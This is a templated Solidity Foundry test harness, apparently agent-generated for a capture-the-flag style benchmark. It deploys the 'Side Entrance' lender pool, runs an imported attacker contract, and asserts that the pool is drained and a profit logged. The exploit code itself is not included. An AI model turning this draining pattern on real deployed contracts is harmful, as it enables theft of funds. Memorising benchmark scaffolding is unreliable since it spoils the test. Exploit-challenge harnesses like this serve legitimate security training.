// SPDX-License-Identifier: MIT
// AGENT-GENERATED harness: {{STRATEGY_ID}} on {{CHALLENGE_NAME}}.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {SideEntranceLenderPool} from "../../src/challenges/SideEntranceLenderPool.sol";
import {SideEntranceAttacker} from "../../src/attackers/SideEntranceAttacker.sol";

contract {{TEST_CONTRACT}} is Test {
    // Accept the drained loot.
    receive() external payable {}

    function test_agentSolve() public {
        uint256 poolBalance = {{FLASH_AMOUNT}};
        vm.deal(address(this), poolBalance + 1 ether);

        SideEntranceLenderPool pool = new SideEntranceLenderPool();
        pool.deposit{value: poolBalance}();

        SideEntranceAttacker attacker = new SideEntranceAttacker(address(pool));
        attacker.attack(poolBalance);

        assertEq(address(pool).balance, 0, "pool not drained");
        console2.log("[PROFIT_WEI]", address(this).balance);
        assertGt(address(this).balance, 0);
    }
}
